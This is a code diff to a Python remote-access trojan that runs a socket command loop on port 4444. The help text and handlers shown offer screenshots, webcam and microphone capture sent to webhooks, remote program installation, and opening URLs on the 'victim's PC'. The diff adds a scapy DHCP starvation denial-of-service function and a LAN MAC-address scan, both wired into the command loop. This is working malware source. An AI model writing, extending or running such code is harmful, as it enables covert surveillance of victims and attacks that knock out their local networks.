@@ -8,6 +8,7 @@ import psutil
 import ctypes
 import pynput
 import shutil
+import typing
 import requests
 import webbrowser
 import pyautogui
@@ -20,7 +21,7 @@ import sounddevice as sd
 import wavio as wv
 from cv2 import imshow, imwrite, destroyWindow, waitKey
 
-
+e = False
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
@@ -29,12 +30,26 @@ port = 4444
 ipadd = get('https://api.ipify.org').text
 
 class back:
+    def dos(self, packets:int, dst='ff:ff:ff:ff:ff:ff'):
+        conf.checkIPaddr = False
+        count = 1
+        
+        for i in range(0, int(packets)):
+            dhcp_discover = Ether(dst=dst,src=RandMAC())  \
+                                /IP(src='0.0.0.0',dst='255.255.255.255') \
+                                /UDP(sport=68,dport=67) \
+                                /BOOTP(op=1,chaddr = RandMAC()) \
+                                /DHCP(options=[('message-type','discover'),('end')])
+            sendp(dhcp_discover,iface='Ethernet',verbose=1)
+            print(count)
+            count += 1
+
     def getaway_mac(self):
         arp = ARP(pdst="192.168.1.1/24")
         eth = Ether(dst="ff:ff:ff:ff:ff:ff")
         a = eth/arp
         answer = srp(a, timeout=1, verbose=False)[0]
-        count = 0
+        count = 1
 
         for element in answer:
             js = colored(f"\n{count} ==>:  {element[1].psrc}: {element[1].hwsrc}\n", "green")
@@ -42,16 +57,18 @@ class back:
             count += 1
 
     def help_desk(self):
-        self.help_ = ("=================================================================================\n"+
-                    "|| 1.) bye                         -- To close the session.                     ||\n"+
-                    "|| 2.) screen -webhook             -- To take screenshot.                       ||\n"+
-                    "|| 3.) webcam -webhook             -- To take webcam photo.                     ||\n"+
-                    "|| 4.) record -t -c -freq -webhook -- To record sound from Mic.                 ||\n"+
-                    "|| 5.) list                        -- To list the process id.                   ||\n"+
-                    "|| 6.) install -url                -- To install any program.                   ||\n"+
-                    "|| 7.) open -link                  -- To open any url on victim's PC.           ||\n"+
-                    "|| 8.) wallpaper -path             -- Changes the wallpaper of the victim's PC. ||\n"+
-                    "=================================================================================\n")          
+        self.help_ = ("==================================================================================\n"+
+                    "||  1.) bye                         -- To close the session.                     ||\n"+
+                    "||  2.) screen -webhook             -- To take screenshot.                       ||\n"+
+                    "||  3.) webcam -webhook             -- To take webcam photo.                     ||\n"+
+                    "||  4.) record -t -c -freq -webhook -- To record sound from Mic.                 ||\n"+
+                    "||  5.) list                        -- To list the process id.                   ||\n"+
+                    "||  6.) install -url                -- To install any program.                   ||\n"+
+                    "||  7.) open -link                  -- To open any url on victim's PC.           ||\n"+
+                    "||  8.) wallpaper -path             -- Changes the wallpaper of the victim's PC. ||\n"+
+                    "||  9.) get mac                     -- Sends the mac addresses of victim's LAN.  ||\n"+
+                    "|| 10.) dos -number -mac(optional)  -- DHCP starvation on the LAN or single MAC. ||\n"+
+                    "==================================================================================\n")          
         s.send(self.help_.encode())
 
     def screenshot(self, url):
@@ -143,7 +160,18 @@ class back:
             elif (cmd[:4] == "open"):
                 fi = cmd[5:-1]
                 self.open_url(fi)  
-
+            
+            elif (cmd[:3] == "dos"):
+                px = cmd[4:-1]
+                a = px.split(" ")
+                if len(a) == 1:
+                    d = Thread(target=self.dos, args=(a[0],),).start()
+                else:
+                    dd = Thread(target=self.dos, args=(a[0], a[1]),).start()
+            
+            elif (cmd[:7] == "get mac"):
+                self.getaway_mac()
+            
             elif (cmd[:6] == "webcam"):
                 time.sleep(0.5)
                 xi = cmd[7:-1]
@@ -162,7 +190,7 @@ class back:
                 ai = cmd[7:-1]
                 c = ai.split(" ")
                 self.record_sound(c[0], c[1], c[2], c[3])
-
+                
             elif (cmd[:4] == "help"):
                 self.help_desk()
 
